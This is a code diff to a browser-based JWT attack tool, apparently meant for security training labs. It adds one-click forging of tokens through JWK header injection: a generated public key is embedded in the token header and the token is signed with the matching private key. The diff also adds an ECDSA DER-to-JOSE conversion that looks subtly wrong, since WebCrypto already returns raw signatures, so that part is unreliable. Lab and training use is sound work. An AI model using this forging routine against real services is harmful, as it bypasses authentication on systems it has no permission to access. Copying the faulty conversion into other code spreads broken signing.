@@ -11,6 +11,7 @@ const extraInputHelp = document.getElementById('extraInputHelp');
 const jwkTools = document.getElementById('jwkTools');
 const jwkAlgSelect = document.getElementById('jwkAlgSelect');
 const genJwkAlgKeyBtn = document.getElementById('genJwkAlgKeyBtn');
+const embedJwkSignBtn = document.getElementById('embedJwkSignBtn');
 const jwkAlgHelp = document.getElementById('jwkAlgHelp');
 const generateBtn = document.getElementById('generateBtn');
 const resultToken = document.getElementById('resultToken');
@@ -25,6 +26,7 @@ if (sourceToken.value) decodeJwt();
 
 reloadBtn.addEventListener('click', decodeJwt);
 genJwkAlgKeyBtn.addEventListener('click', generateKeyForJwkAttack);
+embedJwkSignBtn.addEventListener('click', () => generateJwkAttackToken(true));
 
 for (const btn of document.querySelectorAll('[data-attack]')) {
   btn.addEventListener('click', () => {
@@ -38,6 +40,11 @@ for (const btn of document.querySelectorAll('[data-attack]')) {
 configureInputForAttack(selectedAttack);
 
 generateBtn.addEventListener('click', async () => {
+  await generateJwkAttackToken(false);
+});
+
+
+async function generateJwkAttackToken(forceJwkSign) {
   try {
     decodeError.textContent = '';
     const [headerB64] = mustParseToken(sourceToken.value.trim());
@@ -71,19 +78,31 @@ generateBtn.addEventListener('click', async () => {
     if (selectedAttack === 'jwk-header-injection') {
       const alg = jwkAlgSelect.value;
       nextHeader.alg = alg;
-      const publicJwk = readJsonInput('{"kty":"RSA","e":"AQAB","n":"..."}', 'Provide public JWK JSON.');
-      nextHeader.jwk = publicJwk;
 
+      let publicJwk;
+      if (extraInput.value.trim()) {
+        publicJwk = readJsonInput('{"kty":"RSA","e":"AQAB","n":"..."}', 'Provide public JWK JSON.');
+      } else if (generatedJwkMaterial?.publicJwk) {
+        publicJwk = generatedJwkMaterial.publicJwk;
+        extraInput.value = JSON.stringify(publicJwk);
+      } else {
+        throw new Error('Generate key first or provide public JWK JSON.');
+      }
+
+      nextHeader.jwk = publicJwk;
       const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
+
       if (generatedJwkMaterial && generatedJwkMaterial.alg === alg && isSameJwk(generatedJwkMaterial.publicJwk, publicJwk)) {
         nextSig = await signWithMaterial(signingInput, alg, generatedJwkMaterial);
+      } else if (forceJwkSign) {
+        throw new Error('Cannot sign: selected JWK does not match generated key material.');
       } else {
         nextSig = '<generate-key-or-sign-manually>';
       }
 
       notes = [
         `Lab: JWT authentication bypass via jwk header injection (${alg}).`,
-        'Generate key in this section to auto-sign, or sign manually if using external key.',
+        'Burp-style flow: generated key embedded as jwk and token signed with private key.',
       ];
     }
 
@@ -111,7 +130,7 @@ generateBtn.addEventListener('click', async () => {
   } catch (err) {
     decodeError.textContent = `Generation error: ${err.message}`;
   }
-});
+}
 
 copyBtn.addEventListener('click', async () => {
   await navigator.clipboard.writeText(resultToken.value);
@@ -328,14 +347,37 @@ async function rsaPssSignBase64url(message, privateJwk, hash, saltLength) {
 
 async function ecdsaSignBase64url(message, privateJwk, hash) {
   const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'ECDSA', namedCurve: privateJwk.crv }, false, ['sign']);
-  const signature = await crypto.subtle.sign({ name: 'ECDSA', hash }, key, new TextEncoder().encode(message));
-  return arrayBufferToBase64url(signature);
+  const der = await crypto.subtle.sign({ name: 'ECDSA', hash }, key, new TextEncoder().encode(message));
+  const jose = derToJose(new Uint8Array(der), privateJwk.crv);
+  return arrayBufferToBase64url(jose.buffer);
 }
 
 async function eddsaSignBase64url(message, privateJwk) {
   const key = await crypto.subtle.importKey('jwk', privateJwk, { name: 'Ed25519' }, false, ['sign']);
   const signature = await crypto.subtle.sign('Ed25519', key, new TextEncoder().encode(message));
   return arrayBufferToBase64url(signature);
+}
+
+
+function derToJose(derSig, crv) {
+  const partLen = crv === 'P-256' ? 32 : crv === 'P-384' ? 48 : 66;
+  if (derSig[0] !== 0x30) throw new Error('Invalid DER signature format');
+  let offset = 2;
+  if (derSig[offset] !== 0x02) throw new Error('Invalid DER signature format');
+  const rLen = derSig[offset + 1];
+  let r = derSig.slice(offset + 2, offset + 2 + rLen);
+  offset = offset + 2 + rLen;
+  if (derSig[offset] !== 0x02) throw new Error('Invalid DER signature format');
+  const sLen = derSig[offset + 1];
+  let ss = derSig.slice(offset + 2, offset + 2 + sLen);
+
+  if (r[0] === 0x00 && r.length > partLen) r = r.slice(1);
+  if (ss[0] === 0x00 && ss.length > partLen) ss = ss.slice(1);
+
+  const out = new Uint8Array(partLen * 2);
+  out.set(r.slice(Math.max(0, r.length - partLen)), partLen - Math.min(partLen, r.length));
+  out.set(ss.slice(Math.max(0, ss.length - partLen)), partLen * 2 - Math.min(partLen, ss.length));
+  return out;
 }
 
 function arrayBufferToBase64url(buffer) {
